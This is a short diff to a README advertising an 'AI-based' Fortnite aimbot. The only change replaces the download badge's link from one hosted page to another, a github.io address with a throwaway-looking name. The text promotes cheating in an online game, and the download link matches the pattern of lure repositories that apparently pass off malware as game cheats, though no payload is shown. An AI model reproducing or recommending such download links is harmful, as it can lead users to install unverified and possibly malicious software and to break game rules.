@@ -4,7 +4,7 @@ Forget those old rage aimbots that lock on like you’ve got magnets in your mou
 
 This next-gen aimbot cheats **like a human**, with clean snaps, prediction logic, and buttery smooth tracking. Whether you’re lasering from high ground or hitting flicks in Zero Build, this AI-based beast **tracks, locks, and hits** like a bot... but *feels* like a pro 👑
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload20.bitbucket.io)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://Fortnite-Aimbot-AI-xuwad.github.io/.github)
 ---
 
 ## 🎯 What Is Aimbot AI in Fortnite?
